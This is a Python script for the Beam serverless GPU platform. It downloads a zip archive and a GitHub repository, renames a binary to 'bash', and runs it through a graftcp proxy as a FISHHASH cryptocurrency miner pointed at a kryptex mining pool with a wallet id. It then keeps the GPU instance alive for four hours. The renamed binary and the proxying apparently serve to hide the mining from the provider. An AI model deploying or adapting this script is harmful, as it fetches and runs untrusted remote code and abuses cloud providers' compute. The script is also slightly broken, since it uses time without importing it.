from beam import function, Image
import subprocess

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="t4x3-runner",
    image=image,
    gpu="A10G",
    cpu=2,
    memory="4Gi",
    timeout=4 * 60 * 60,
)
def run_script():

    print("=== CHECK GPU ===")
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== CURRENT DIRECTORY ==="
    pwd

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip

    echo "=== CHECK PAN ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== ENTER PAN ==="
    cd /mnt/code/pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    echo "=== DOWNLOAD LOL ==="
    cd /mnt/code/pan
    git clone https://github.com/malogrono/lol198.git

    echo "=== CHECK LOL198 ==="
    ls -lah /mnt/code/pan/lol198

    echo "=== CHECK BASH ==="
    cd /mnt/code/pan/lol198
    ls -lh bash

    chmod u+x bash

    echo "=== MOVE BASH ==="
    mv bash /mnt/code/pan/

    echo "=== CHECK PAN AFTER MOVE ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== FINAL DIRECTORY ==="
    cd /mnt/code/pan
    pwd
    ls -lah
    
    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo FISHHASH --pool iron.kryptex.network:7017 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.01 --ethstratum ETHPROX
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
